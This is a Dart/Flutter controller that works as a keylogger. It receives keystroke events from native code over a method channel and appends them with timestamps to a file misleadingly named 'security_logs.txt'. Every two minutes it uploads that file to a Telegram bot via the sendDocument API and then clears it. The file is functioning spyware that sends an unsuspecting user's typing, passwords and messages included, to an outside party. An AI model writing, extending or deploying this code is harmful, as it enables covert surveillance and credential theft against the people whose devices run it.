import 'dart:async';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_dotenv/flutter_dotenv.dart';
import 'package:get/get.dart';
import 'package:path_provider/path_provider.dart';
import 'package:http/http.dart' as http;

class LoggerController extends GetxController {
  static const platform = MethodChannel('com.example.app/events');
  var logs = <String>[].obs;
  Timer? _timer;

  @override
  void onInit() {
    super.onInit();
    _initMethodChannel();
    _startTimer();
  }

  void _initMethodChannel() {
    platform.setMethodCallHandler((call) async {
      if (call.method == "onKeyStroke") {
        String entry = "${DateTime.now()}: ${call.arguments}";
        logs.insert(0, entry);
        await _saveToFile(entry);
      }
    });
  }

  void _startTimer() {
    _timer = Timer.periodic(const Duration(minutes: 2), (timer) {
      sendLogFile();
    });
  }

  Future<void> _saveToFile(String text) async {
    final directory = await getApplicationDocumentsDirectory();
    final file = File('${directory.path}/security_logs.txt');
    await file.writeAsString('$text\n', mode: FileMode.append);
  }

  Future<void> sendLogFile() async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final file = File('${directory.path}/security_logs.txt');

      if (!await file.exists() || await file.length() == 0) return;

      var request = http.MultipartRequest(
        'POST',
        Uri.parse(
          'https://api.telegram.org/bot${dotenv.env['BOOT_TOKEN']}/sendDocument',
        ),
      );

      request.fields['chat_id'] = dotenv.env['CHAT_ID']!;
      request.fields['caption'] = "New Logs: ${DateTime.now()}";
      request.files.add(
        await http.MultipartFile.fromPath('document', file.path),
      );

      var response = await request.send();

      if (response.statusCode == 200) {
        await file.writeAsString('');
        debugPrint("Telegram: Sent and cleared local logs.");
      } else {
        debugPrint("Telegram Error: ${response.statusCode}");
      }
    } catch (e) {
      debugPrint("Send Error: $e");
    }
  }

  @override
  void onClose() {
    _timer?.cancel();
    super.onClose();
  }
}
